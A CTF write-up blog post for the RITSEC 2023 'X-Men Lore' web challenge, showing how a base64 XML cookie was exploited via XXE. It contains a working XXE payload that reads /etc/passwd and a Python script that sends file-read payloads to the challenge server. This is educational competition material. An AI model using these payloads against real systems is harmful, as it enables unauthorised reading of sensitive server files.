---
layout: post
title:  RITSEC 2023 - Web / X-Men Lore
summary: 'Writeup for RITSEC 2023 "X-Men Lore" Challenge'
author: leo
date: '2023-04-02 00:00:00 -0400'
category: ritsec-ctf-2023
thumbnail: /assets/img/posts/ritsec-ctf-2023/logo.png
include_thumbnail: false
keywords: security, ctf, ritsec
permalink: /blog/ritsec-ctf-2023/web/x-men-lore
usemathjax: true
---

# The Challenge
There's an x-men themed website that gives you buttons to view more info about a given "X-Man".

## Cookies On Click
After clicking around for a bit, I noticed that the URL for every x-man was the same: `/xmen`.  This told me that we were either doing a post request or using a cookie of some kind.  After viewing the links on the main page, I noticed something a bit odd in the HTML:
```html
<a href="/xmen">
    <button onclick="document.cookie='xmen=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4='">
      Beast
    </button>
</a>
```
This is a link, with a button that sets a cookie before it navigates.  This is pretty unusual, so let's dig in a bit.

## The Cookie Value
First and foremost, this cookie value looks like base64 data.  Let's decode it:

```
echo -n 'PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ+PHhtZW4+QmVhc3Q8L3htZW4+PC9pbnB1dD4=' | base64 -d
<?xml version='1.0' encoding='UTF-8'?><input><xmen>Beast</xmen></input>
```

....it's XML? Well this just keeps getting weirder.  

## XXE
Inspecting each of the cookie values that the buttons set, I can see that there's always an `input` and `xmen` attribute.  This is screaming XXE.  Let's try one!
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<input>
    <xmen>&xxe;</xmen>
</input>
```

And our base-64 encoded version:
```
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIGZvbyBbIDwhRUxFTUVOVCBmb28gQU5ZID4KPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIiA+XT4KPGlucHV0PgogICAgPHhtZW4+Jnh4ZTs8L3htZW4+CjwvaW5wdXQ+
```

For now, I manually set the cookie in my browser using the dev tools, and refreshed the `/orders` page:

![setting cookie value in dev tools](/assets/img/posts/ritsec-ctf-2023/x-men-lore/set-cookie.png 'Setting the Cookie')
<br /><br />
![etc passwd leaked](/assets/img/posts/ritsec-ctf-2023/x-men-lore/etc-passwd-leak.png 'Leaking /etc/passwd')
<br /><br />

## Grabbing the Flag
Great!  We have an LFI via XEE, and we can just go on our merry way and grab the flag.  It's DEFINITELY going to be at `~/flag.txt`, right??? Wrong.  I spent about 20 minutes piecing together the exploit, and that was a ton of fun!  Simple, educational, easy enough to understand.  What took me two hours?  Finding the dang flag.  I finally found it at `/flag`, but... I really wish they standardized the location of where to find flags.  Someone in the CTF Discord said something that resonated with me.  I'm omitting their name and only quoting part of the message, so, realize there's probably more context:
> the difficulty should be in exploiting the problem, not in going around trying to do random stuff to find the flag. 

Because I was so frustrated trying to find the flag, I decided to see if I could find the server source code.  That was another guessing game, but I eventually found it at `/home/user/app.py`:
```python
from flask import Flask, render_template, request, redirect, url_for
import lxml.etree as ET
from base64 import b64decode
app = Flask(__name__)

@app.route("/")
def index():
  return render_template("index.html")

@app.route("/xmen")
def xmen():
  cookie = request.cookies.get("xmen")
  try:
    b64decode(cookie)
    data = ET.fromstring(b64decode(cookie))
  except:
    return redirect(url_for("index"))
  return render_template("xmen.html", data=data)

```

This was working exactly as you'd expect, there was no secret sauce here.  I even set up the server to run locally to see if I could figure out a payload to get a directory listing.  I did everything I could to avoid brute-forcing it, because that slows the webserver down, causes crashes, and ruins the fun for everyone else for a few fake internet points.

## The Next Day
After shutting down for the night feeling defeated, I checked back the next day and they released a hint, basically telling you the flag isn't where you thought it was. ...well that was obvious to me already, so not a lot of help.  A teammate gave me a quick python script to make my guesses a bit faster:

```python
import requests
import argparse
import base64


parser = argparse.ArgumentParser()
parser.add_argument("hack")

url = "https://xmen-lore-web.challenges.ctf.ritsec.club/xmen"
payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file://{command}" >]>
<input>
    <xmen>&xxe;</xmen>
</input>"""

if __name__ == "__main__":

    args  = parser.parse_args()
    encoded_cookie = base64.b64encode(bytes(payload.format(command=args.hack), 'utf-8'))
    resp = requests.get(url, cookies={"xmen": encoded_cookie.decode('utf-8')})
    print(resp.text)

```

Using this, I just guessed enough until I found it was living at `/flag`.  

# Conclusion
This is the only challenge that I've given constructive or critical feedback for. With that said, it didn't ruin the fun or my opinion or RITSEC CTF.  They put on such an awesome CTF this year, and I'm glad I was able to participate!
